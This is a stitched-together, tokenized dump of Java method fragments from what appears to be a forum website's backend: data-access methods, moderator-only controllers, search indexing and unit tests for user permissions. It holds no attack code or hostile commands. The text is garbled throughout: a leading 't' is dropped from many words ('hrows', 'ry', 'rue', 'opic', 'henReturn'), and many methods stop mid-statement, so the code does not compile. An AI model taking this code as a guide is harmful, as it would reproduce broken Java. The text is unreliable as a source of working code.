secure , resultSet . getBoolean ( " bbcode " ) ) ; } else { messageText = null ; } return new RepliesListItem ( cid , cAuthor , cDate , messageText , groupTitle , groupUrlName , sectionTitle , sectionId , subj , lastmod , msgid , ype , eventMessage , eventDate ) ; 
public String prepareTextRSS ( String ext , boolean secure , boolean lorcode ) { if ( lorcode ) { return parseCommentRSS ( ext , secure ) ; 
public Group mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Group ( resultSet ) ; } 
public Group mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new Group ( rs ) ; } 
public int calcTopicsCount ( Group group , boolean showDeleted ) { String query = " SELECT count(topics.id) " + " FROM topics WHERE " + ( group . isModerated ( ) ? " moderate AND " : " " ) + " groupid=? " ; if ( ! showDeleted ) { query + = " AND NOT topics.deleted " ; } List < Integer > res = jdbcTemplate . queryForList ( query , Integer . class , group . getId ( ) ) ; if ( ! res . isEmpty ( ) ) { return res . get ( 0 ) ; 
public String doInPreparedStatement ( PreparedStatement pst ) hrows SQLException , DataAccessException { pst . setString ( 1 , itle ) ; if ( info . length ( ) > 0 ) { pst . setString ( 2 , info ) ; } else { pst . setString ( 2 , null ) ; } if ( longInfo . length ( ) > 0 ) { pst . setString ( 3 , longInfo ) ; } else { pst . setString ( 3 , null ) ; } pst . setBoolean ( 4 , resolvable ) ; pst . setString ( 5 , urlName ) ; pst . setInt ( 6 , group . getId ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public Group getGroup ( Message message ) hrows BadGroupException { return groupDao . getGroup ( message . getGroupId ( ) ) ; } 
public void groupsTest ( ) hrows Exception { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . henReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; Assert . assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; Assert . assertTrue ( " General " . equals ( groupDto . getTitle ( ) ) ) ; } 
public Topic get ( ) hrows MessageNotFoundException { return messageDao . getById ( poll . getTopicId ( ) ) ; } 
public PreparedPoll preparePoll ( Topic opic ) hrows PollNotFoundException { Poll poll = pollDao . getPollByTopicId ( opic . getId ( ) ) ; return new PreparedPoll ( poll , 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , SolrServerException , MessageNotFoundException { Topic msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentDao.getCommentList(msg, true); 
private void updateMessage ( Topic opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Topic opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopicId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . addField ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public static EditInfoDTO createFromMessage ( TagDao agDao , Topic message ) { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . oString ( agDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public PreparedTopic prepareMessage ( Topic message , boolean minimizeCut , boolean secure ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure ) ; } 
public PreparedTopic prepareMessage ( Topic message , List < String > ags , PreparedPoll newPoll , boolean secure ) { return prepareMessage ( message , ags , false , newPoll , secure ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > ags , boolean minimizeCut , PreparedPoll poll , boolean secure ) { ry { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PreparedTopic > prepareMessagesFeed ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , rue , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddTopicRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new EditTopicRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public List < Topic > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return nv . getMessages ( con ) ; } 
public List < Topic > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return newsViewer . getMessagesCached ( con ) ; } 
public List < Topic > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return newsViewer . getMessages ( con ) ; } 
public List < Topic > doInConnection ( Connection con ) hrows SQLException , DataAccessException { return feedBurner ? nv . getMessages ( con ) : nv . getMessagesCached ( con ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( message . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! message . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( message . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . oString ( ) ) ) ; } 
private static void checkView ( Topic message , Template mpl , User currentUser ) hrows MessageNotFoundException { if ( mpl . isModeratorSession ( ) ) { return ; } if ( message . isDeleted ( ) ) { if ( message . isExpired ( ) ) { 
private static boolean checkLastModified ( WebRequest webRequest , Topic message ) { ry { return webRequest . checkNotModified ( message . getLastModified ( ) . getTime ( ) ) ; 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " setpostscore " ) ; Topic message = messageDao . getById ( msgid ) ; mv . addObject ( " message " , message ) ; mv . addObject ( " group " , groupDao . getGroup ( message . getGroupId ( ) ) ) ; return mv ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; Section section = sectionDao . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic message = messageDao . getById ( msgid ) ; mv . getModel ( ) . put ( " message " , message ) ; Section section = sectionDao . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Topic message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public Topic getById ( int id ) hrows MessageNotFoundException { Topic message ; ry { message = jdbcTemplate . queryForObject ( queryMessage , new RowMapper < Topic > ( ) { @Override public Topic mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Topic ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return message ; } 
public Topic mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Topic ( resultSet ) ; } 
public Group getGroup ( Topic message ) hrows BadGroupException { return groupDao . getGroup ( message . getGroupId ( ) ) ; } 
public void undelete ( Topic message ) { jdbcTemplate . update ( updateUndeleteMessage , message . getId ( ) ) ; jdbcTemplate . update ( updateUneleteInfo , message . getId ( ) ) ; } 
public void uncommit ( Topic msg ) { jdbcTemplate . update ( " UPDATE topics SET moderate='f',commitby=NULL,commitdate=NULL WHERE id=? " , msg . getId ( ) ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author ; User lastCommentBy ; int msgid ; int cid ; int pages ; Timestamp lastmod ; Timestamp postdate ; int stat1 ; int stat3 ; int stat4 ; int groupId ; int section ; String groupTitle ; String groupUrlName ; String itle ; boolean resolved ; boolean uncommited ; ry { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; itle = resultSet . getString ( " itle " ) ; cid = resultSet . getInt ( " cid " ) ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Topic . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public boolean supports ( Class < ? > clazz ) { return AddTopicRequest . class . equals ( clazz ) ; } 
public boolean supports ( Class < ? > clazz ) { return EditTopicRequest . class . equals ( clazz ) ; } 
public String formatJump ( TopicDao messageDao , boolean secure ) hrows MessageNotFoundException , URIException { if ( messageUrl ) { Topic message = messageDao . getById ( messageId ) ; Group group = null ; ry { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { hrow new RuntimeException ( " Invalid group id msgid= " + messageId , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( commentUrl ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
private void processMessageUrl ( boolean secure , StringBuilder out , LorURI uri ) hrows URIException { ry { Topic message = messageDao . getById ( uri . getMessageId ( ) ) ; 
public void prepareMessageTest ( ) { ImmutableList < String > ags = ImmutableList . of ( " one " , " wo " ) ; Topic message = mock ( Topic . class ) ; PollDao pollDao = mock ( PollDao . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDao . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; TopicDao messageDao = mock ( TopicDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . henReturn ( 13 ) ; group id 13 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; messageDao = mock ( TopicDao . class ) ; message1 = mock ( Topic . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Topic . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Topic . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Topic . class ) ; group12 = mock ( Group . class ) ; message15 = mock ( Topic . class ) ; group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . henReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . henReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . henReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . henReturn ( message15 ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int opics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " opics " , opics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } String partFilter ; String partWiki = queryPartWiki ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author ; ry { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } int msgid = resultSet . getInt ( " id " ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; int stat1 = resultSet . getInt ( " stat1 " ) ; int stat3 = resultSet . getInt ( " stat3 " ) ; int stat4 = resultSet . getInt ( " stat4 " ) ; int groupId = resultSet . getInt ( " gid " ) ; String groupTitle = resultSet . getString ( " gtitle " ) ; String itle = resultSet . getString ( " itle " ) ; int cid = resultSet . getInt ( " cid " ) ; User lastCommentBy ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } boolean resolved = resultSet . getBoolean ( " resolved " ) ; int section = resultSet . getInt ( " section " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; Timestamp postdate = resultSet . getTimestamp ( " postdate " ) ; boolean uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; int pages = Topic . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public static EditInfoDto createFromMessage ( TagDao agDao , Topic message ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . oString ( agDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { EditInfoDto editInfoDTO = new EditInfoDto ( ) ; editInfoDTO . setId ( resultSet . getInt ( " id " ) ) ; editInfoDTO . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editInfoDTO . setEditor ( resultSet . getInt ( " editor " ) ) ; editInfoDTO . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editInfoDTO . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editInfoDTO . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editInfoDTO . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editInfoDTOs . add ( editInfoDTO ) ; } 
public List < EditInfoDto > loadEditInfo ( int msgid ) { List < EditInfoDto > list = jdbcTemplate . query ( " SELECT * FROM edit_info WHERE msgid=? ORDER BY id DESC " , BeanPropertyRowMapper . newInstance ( EditInfoDto . class ) , msgid ) ; return ImmutableList . copyOf ( list ) ; } 
public User getUser ( String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { hrow new UserNotFoundException ( " <invalid name> " ) ; } Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; List < User > list = jdbcTemplate . query ( queryUserByNick , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } User user = list . get ( 0 ) ; String cacheId = " User?id= " + user . getId ( ) ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
private User getUser ( int id , boolean useCache ) hrows UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { List < User > list = jdbcTemplate . query ( queryUserById , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } res = list . get ( 0 ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public void maxcomTest ( ) hrows Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( resultSet . getString ( " style " ) , " ango " ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) hrows Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( resultSet . getString ( " style " ) , " ango " ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( resultSet . getString ( " style " ) , " ango " ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
